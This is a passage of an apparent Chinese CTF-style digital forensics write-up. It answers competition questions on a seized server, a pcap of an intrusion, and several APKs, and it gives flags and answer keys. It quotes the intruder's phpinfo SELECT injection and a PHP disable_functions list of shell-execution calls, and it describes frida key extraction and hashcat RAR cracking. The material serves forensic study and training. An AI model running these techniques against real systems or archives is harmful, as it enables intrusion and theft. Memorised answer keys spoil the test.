src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-9.png" alt="image-20241103173815700"></p><p><strong>10. 请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999.99)</strong></p><p>导入上题的备份数据库，然后打开看看，发现原价</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/fwq-10.png" alt="image-20241103174813606"></p><p>什么玩意这么贵我勒个骚刚</p><h3 id="流量取证"><a href="#流量取证" class="headerlink" title="流量取证"></a><strong>流量取证</strong></h3><p><strong>1. 请分析流量分析.pcapng文件，并回答入侵者的IP地址是？</strong></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/llfx-1.png" alt="image-20241103183551733"></p><p>这个流量包只有130和250两个，相对好分析一些；</p><p>筛选HTTP的POST流量，发现130一直在尝试用1个用户名和多个不同的密码试图登录250的root账号，所以入侵者是130</p><p>192.168.85.130</p><p><strong>2. 请分析流量分析.pcapng文件，并回答被入侵计算机中的cms软件版本是？(答案格式：1.1.1)</strong></p><p>cms首先想到wordpress，strings一下wordpress，发现版本</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/llfx-2.png" alt="image-20241103184605557"></p><p>5.2.1</p><p><strong>3. 请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL版本号是？(答案格式：1.1.1)</strong></p><p>strings一下version，保存内容，找mysql，找到是5.5.3</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/llfx-3.png" alt="image-20241103184935796"></p><p><strong>4. 请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL root账号密码是？</strong></p><p>整体分析POST流量发现是入侵者尝试登录MYSQL，最后登陆成功，还修改了配置；</p><p>直接定位到最后一次登陆尝试，这次是成功的，密码为</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/llfx-4.png" alt="image-20241103185321208"></p><p>admin@12345</p><p><strong>5. 请分析流量分析.pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？</strong></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/llfx-5.png" alt="image-20241103185539940"></p><p>06b8dcf11e2f7adf7ea2999d235b8d84.php</p><p><strong>6. 请分析流量分析.pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？</strong></p><p>禁用函数想到前面分析流量的时候，在入侵者成功登录后用SELECT了&lt;?php phpinfo();?&gt;所以看这条的回显，不知道为什么搜disable搜不到，那再次祭出strings大法，找到这些；</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/llfx-6.png" alt="image-20241103191004481"></p><p>去掉html的东西，禁用了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">system</span><br><span class="line">passthru</span><br><span class="line">exec</span><br><span class="line">shell_exec</span><br><span class="line">popen</span><br><span class="line">escapeshellarg</span><br><span class="line">escapeshellcmd</span><br><span class="line">proc_close</span><br><span class="line">proc_open</span><br><span class="line">dl</span><br></pre></td></tr></table></figure><p>一共10个</p><p><strong>7. 请分析流量分析.pcapng文件，并回答入侵者提权后，执行的第1条命令是？</strong></p><p>提权成功后进入shell，直接筛选</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp contains &quot;C:\\Windows\\system32&gt;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/llfx-7.png" alt="image-20241103192321694"></p><p>dir</p><p><strong>8. 请分析流量分析.pcapng文件，并回答被入侵计算机开机时间是？</strong></p><p>A、2019&#x2F;6&#x2F;13 18:51:33<br>B、2019&#x2F;6&#x2F;13 18:50:33<br>C、2019&#x2F;6&#x2F;13 18:53:33<br>D、2019&#x2F;6&#x2F;13 18:52:33</p><p>追踪第一个流，以UTF-8形式保存下来，发现这个：</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/llfx-8.png" alt="image-20241103192734322"></p><p>B</p><p><strong>9. 请分析流量分析.pcapng文件，并回答被入侵计算机桌面上的文件中flag是？(答案格式：abcdef123456789)</strong></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/llfx-9.png" alt="image-20241103192925394"></p><p>3f76818f507fe7e66422bd0703c64c88</p><p><strong>10. 请分析流量分析.pcapng文件，并回答图片文件中的flag是？(答案格式：abcdef123456789)</strong></p><p>图片的flag直接导出图片，用binwalk分离，压缩包是坏的但是由于没有加密所以txt内容直接可以看到</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/llfx-10.png" alt="llfx-10"></p><p>d31c1d06331a9534bf41ab93afca8d31</p><h3 id="APK功能分析"><a href="#APK功能分析" class="headerlink" title="APK功能分析"></a><strong>APK功能分析</strong></h3><p><strong>1. 请分析1.备忘录.apk反编译出的文件中，正确答案在哪个文件里？</strong></p><p>这题问的是第三题的flag在哪个文件储存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">知识点：资源文件夹下的layout储存定义安卓应用布局的xml文件，activity_main.xml定义主界面布局</span><br></pre></td></tr></table></figure><p>看一下文件，发现确实在这里；</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/apk-1.png" alt="image-20241103200941214"></p><p><strong>2. 请分析1.备忘录.apk并找到程序中的主activity是？（答案格式：com.tencent.mm.activity）</strong></p><p>这个在雷电里面有<img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/apk-2.png" alt="image-20241103200941214"></p><p><strong>3. 请分析1.备忘录.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</strong></p><p>把apk放到雷电模拟器里仿真，打开app，两串base64，解码SEx7ZDBiMjA1OGEtYWMyOS0xMWVkLTgwN2YtYWNkZTQ4MDAxMTIyfQ&#x3D;&#x3D;有HL{d0b2058a-ac29-11ed-807f-acde48001122}</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/apk-3.png" alt="image-20241103195812973"></p><p><strong>4. 请分析2.easyapk.apk中SharedPreferences配置文件的名称(包括后缀)是什么？</strong></p><p><strong>5. 请分析2.easyapk.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</strong></p><p>这两题也合起来，先看T5比较合适，首先仿真后发现apk的功能是判断字符串与flag是否相等；</p><p>在“敏感信息”输入“正确”字样，可以定位判断逻辑；</p><p>flag的生成是先有五个字符串str1到str5拼一起，加密套上HL{}，然后在拆开来拼上-，然后判断和用户输入是否相等；可以注意到str5实例化了一个prefs类，似乎和T4有关系，打开类看看，找到SP_TAG（sharedpreference标签）为myprefs，在模拟机文件管理器里找，有myprefs.xml（共享是app和手机之间，所以应该跳开app本身去找）</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/apk-4.png" alt="image-20241103204923654"></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/apk-5.png" alt="image-20241103204923654"></p><p>至于flag可以使用frida脚本追踪字符串判断时刻，像抓包一样，打开app，随便给一个输入提交，脚本会抓住判断输入与flag是否相等，因此暴露flag</p><p><strong>HL{55c99ed4-d894-ae59-3a3b-6fe3eed793e7}</strong></p><p><strong>6. 请分析3.verify.apk，该程序中所使用的AES加密KEY值为</strong></p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/apk-6.png" alt="image-20241103210147582"></p><p>搜索“密钥”，一眼顶针</p><p>还是用frida脚本追踪加解密过程，然后直接发现key和iv，密文也有了，解密得到Whose key am I ?</p><p><img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/apk-6-1.png" alt="apk-6-1"></p><p><strong>7. 请分析3.verify.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</strong></p><p>这个在资源文件夹里面的Lookme，看文件头是个7z，改完格式发现是加密的，输入刚才的密钥，发现正确，里面有txt：HL{301b6b90-ac37-11ed-bad4-5811224dd424}</p><p>最后三个不会了，放答案吧</p><p><strong>8. 请分析4.easyjni.zip，压缩包中数据库的解密秘钥为</strong></p><p>搜索“登录”，定位到登录相关的函数在mainactivity那里，因此看源码，发现只要密码和账号满足要求就会触发读库函数，然后再进一步比对；这个时候可以继续使用frida脚本，拦截到密钥如下<img src="/2024/11/04/2024%E8%AD%A6%E5%AF%9F%E5%A4%A7%E5%AD%A6%E7%AC%AC%E4%B8%83%E5%B1%8A%E2%80%9C%E7%B2%BE%E6%AD%A6%E6%9D%AF%E2%80%9D%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%8A%80%E8%83%BD%E6%AF%94%E6%AD%A6wp/apk-8.png" alt="apk-8"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">66d6ad256b0b03143e5571276bcebfc756a8fc0f7322b31ee8a8a2e992cbce37</span><br></pre></td></tr></table></figure><p>用DB Broswer（SQLCipher）打开</p><p>最后两个不会了，放答案吧，还要反编译so文件……</p><p><strong>9. 请分析4.easyjni.zip并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HL&#123;b950f5b8abfd5a0b3331ca65e687ff94&#125;</span><br></pre></td></tr></table></figure><p><strong>10. 请分析5.calc.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HL&#123;96233a87c59bf7f0aa2ed16d9bc2e07a&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>盘古石2023晋级赛</title>
      <link href="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/"/>
      <url>/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/</url>
      
        <content type="html"><![CDATA[<h1 id="盘古石2023晋级赛（手机和计算机取证部分）"><a href="#盘古石2023晋级赛（手机和计算机取证部分）" class="headerlink" title="盘古石2023晋级赛（手机和计算机取证部分）"></a>盘古石2023晋级赛（手机和计算机取证部分）</h1><p><a href="%E6%A1%88%E6%83%85%E8%AE%BE%E8%AE%A1.docx">案情设计</a></p><h2 id="题目-答案"><a href="#题目-答案" class="headerlink" title="题目&amp;答案"></a>题目&amp;答案</h2><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/%E6%99%8B%E7%BA%A7%E8%B5%9B%E9%A2%98%E7%9B%AE%E7%AD%94%E6%A1%88.jpg" alt="晋级赛题目答案"></p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p><strong>1.涉案应用刷刷乐的签名序列号：</strong></p><p>11fcf899</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/1.png" alt="1"></p><p><strong>2.涉案应用刷刷乐是否包含读取短信权限#</strong></p><p>否</p><p>xml中没有，java源码似乎也没有动态授予，只是在定义类中出现</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/2.png" alt="2"></p><p>说明一下，AndroidManifest.xml是用来声明app的权限的；app的权限可以主要分为一般权限，危险权限，在Android6.0以上，一般权限会由安卓直接读取xml文件自动授予；而危险权限的话，则要在动态调用，就是调用前要经过用户的许可；如果是Android5.1一下，危险权限在安装的时候会问用户的许可，如果用户拒绝，应用将不会被安装，常见的危险权限如下：（图片来自：<a href="https://rain9155.github.io/2019/06/06/android6-0%E5%8A%A8%E6%80%81%E6%9D%83%E9%99%90%E7%94%B3%E8%AF%B7%E7%9A%84%E6%AD%A3%E7%A1%AE%E6%B5%81%E7%A8%8B/">android6.0动态权限申请的正确流程 | jianyu的博客 | 每天进步一点点 (rain9155.github.io)</a>）</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/2-1.png" alt="2-1"></p><p><strong>3.涉案应用刷刷乐打包封装的调证ID值为</strong></p><p>A6021386163125</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/3.png" alt="3"></p><p><strong>4.刷刷乐服务器的地址域名</strong></p><p>vip.shuadan.com</p><p>这个直接在敏感信息里搜索.com或者http:&#x2F;&#x2F;都可以找到，注意格式</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/4.png" alt="4"></p><p><strong>5.涉案应用刷刷乐是否存在录音行为#</strong></p><p>是</p><p>这个在xml里没有，但是貌似源码中有动态调用录音权限（抱歉米娜桑，我的java学的不好，错了直接喷）</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/5.png" alt="5"></p><p><strong>6.涉案应用未来资产的包名</strong></p><p>plus.H5CE4B30D</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/6.png" alt="6"></p><p><strong>7.涉案应用未来资产语音服务调证key值</strong></p><p>53feacdd</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/7.png" alt="7"></p><p><strong>8.未来资产的服务器域名是</strong></p><p>vip.usdtre.club</p><p>同刷刷乐</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/8.png" alt="8"></p><p><strong>9.涉案应用未来资产打包封装的调证ID值为</strong></p><p>H5CE4B30D</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/9.png" alt="9"></p><p><strong>10.容恨寒的安卓手机蓝牙物理地址是</strong></p><p>这个不知道为什么火眼没分析出来，直接进&#x2F;Basic&#x2F;deviceinfo.json看看</p><p>A9:8B:34:8B:04:50</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/10.png" alt="10"></p><p><strong>11.容恨寒的安卓手机SIM的ICCID是</strong></p><p>89014103211118510720</p><p>同上图，在最后一行有</p><p><strong>12.团队内部沟通的聊天工具应用程序是</strong></p><p>Potato</p><p>这里也是手动分析出来的，首先看嫌疑人容恨寒装了什么聊天app，我这里有个思路，虽然不是做的时候的</p><p>先看Basic\appinfo.db</p><p>找他的聊天软件，然后，根据包名翻data\data\下的包名文件夹，进数据库看聊天记录，就可以确定</p><p>他的聊天软件有微信，陌陌，Potato</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/12.png" alt="image-20240926190630462"></p><p>↑当时我先翻的potato，找到了如下</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/12-1.png" alt="12-1"></p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/12-2.png" alt="12-2"></p><p>base64解密后是</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/12-3.png" alt="12-3"></p><p>这些信息足够确定嫌疑人在Potato沟通工作，所以答案出来了</p><p><strong>13.团队内部沟通容恨寒收到的最后一条信息是</strong></p><p>收到</p><p>在Potato最大的数据库文件中，找到两个表，如上解密base64发现都是聊天记录，但是不同的是一个表有TONAME列，因此合理推测这个表是单人聊天的数据，另一个则是群聊，找到群聊的表，根据时间排序，最后一条记录解密后为“收到”</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/13.png" alt="13"></p><p><strong>14.刷单.rar的MD5值为</strong></p><p>dc52d8225fd328c592841cb1c3cd1761</p><p>既然手工这么多了，那我继续：首先手机的根目录有一个是storage文件夹，一个data文件夹，其中data是手机本机储存的文件，另一个storage是sd卡之类的，在\storage\emulated\0\Android\data\com.qim.imm\files\Potato\Attachment下发现rar，计算MD5即可；</p><p><strong>15.刷单.rar的解压密码为</strong></p><p>wlzhg@3903@xn</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/15.png" alt="15"></p><p>在这个表里找到的，压缩包密码规则，或者区去聊天记录的表里面批量解密base64也可以找到，那么由图知道容恨寒是西南区所以压缩包密码为wlzhg@?d?d?d?d@xn，只差了四位数字不知道，这里爆破一下，不知道为什么archpr用不了，用hashcat爆破吧，先rar2john计算哈希，再根据其hash爆破</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/15-1.png" alt="15-1"></p><p>爆出来那四位数字是3906</p><p><strong>16.发送刷单.rar的用户的手机号码为</strong></p><p>18969939616</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/16.png" alt="16"></p><p>这个表似乎包含了聊天中发送的文件，还有文件发送记录的ID，复制ID去聊天记录表里面找一下，最后发现是ID对应的聊天记录是容恨寒的，再这个记录了用户信息的表中找他电话就可以</p><p><img src="/2024/10/21/2023%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E6%99%8B%E7%BA%A7%E8%B5%9Bwp(PC+%E6%89%8B%E6%9C%BA%E9%83%A8%E5%88%86)/17.png" alt="image-20240926192651263"></p><p><strong>17.发送多个报表的用户来自哪个部门#</strong></p><p>西南分区</p><p>前文有提到容恨寒是西南分区的</p><p><strong>18.MAC的开机密码是</strong></p><p>apple</p><p>这个也是在火眼找了半天找不着，然后想起来之前看到的应用包名里面有备忘录，猜测可能记录在那里，</p><p>在 坚果pro3\data\data\com.lq.bwljsb\databases下的runs发现了这些，妙哉！这下18和19都搞定了</p><p><img 